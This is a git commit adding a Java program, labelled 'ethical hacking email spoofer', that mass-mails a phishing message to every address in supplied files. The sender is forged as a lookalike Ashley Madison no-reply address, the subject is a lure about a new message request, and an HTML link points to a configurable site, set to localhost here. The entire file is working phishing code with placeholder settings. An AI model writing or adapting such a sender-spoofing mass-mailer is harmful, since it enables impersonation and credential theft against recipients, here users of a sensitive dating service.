58953a334d34cc9cfec22eb5d1db5d4bb0165dee
Brian Richer <brian.mathew.richer@gmail.com>
2018-11-27 10:56:32 -0600

    Add basic email spoofer

---
+++ emailspoofer/SpoofEmail.java
@@ -0,0 +1,73 @@
+// Brian Richer
+// ************
+// Ethical hacking email spoofer
+//
+// Usage: 
+
+import java.util.*;
+import javax.mail.Authenticator;
+import javax.mail.Message;
+import javax.mail.MessagingException;
+import javax.mail.Session;
+import javax.mail.Transport;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeMessage;
+import javax.mail.PasswordAuthentication;
+import static java.lang.System.*;
+
+import java.io.*;
+
+public class SpoofEmail {
+
+	static final String from      = "no-reply@ashleymadisonlife.com";
+	static final String subject   = "You've got a new message request!";
+	static final String siteip    = "localhost";
+	static final String siteport  = "8080";
+	static final String body      = "Click <a href='http://" + siteip + ":" + siteport + "'>here</a> to resolve all pending invitations.";
+	static final String smtp_host = "localhost";
+	static final String smtp_port = "25";
+	static final String smtp_user = "test@test.com";
+	static final String smtp_pass = "test";
+
+	public static void main(String [] args) throws IOException {
+		for (int i=1; i<args.length; i++){
+			parseList(args[i]);
+		}
+	}
+
+	private static void parseList(String filename) throws IOException {
+		//SMTP server
+		Properties prop = new Properties();
+		prop.put("mail.smtp.host", smtp_host);
+		prop.put("mail.smtp.auth", "true");
+		prop.put("mail.smtp.starttls.enable", "true");
+		prop.put("mail.smtp.port", smtp_port);
+		
+		Authenticator auth = new Authenticator() {
+			protected PasswordAuthentication getPasswordAuthentication() {
+				return new PasswordAuthentication(smtp_user, smtp_pass);
+			}
+		};
+
+		Session session = Session.getInstance(prop, auth);
+
+		try (Scanner emails = new Scanner(new File(filename))) {
+			while (emails.hasNextLine()) {
+				String email = emails.nextLine();
+
+				try {
+					MimeMessage msgobj = new MimeMessage(session);
+					msgobj.setFrom(new InternetAddress(from));
+					msgobj.setSubject(subject);
+					msgobj.setText(body, "utf-8", "html");
+					msgobj.setRecipients(Message.RecipientType.TO, InternetAddress.parse(email));
+					Transport.send(msgobj);
+				}
+				catch(MessagingException exp) {
+					exp.printStackTrace();
+					throw new RuntimeException(exp);
+				}
+			}
+		}
+	}
+}
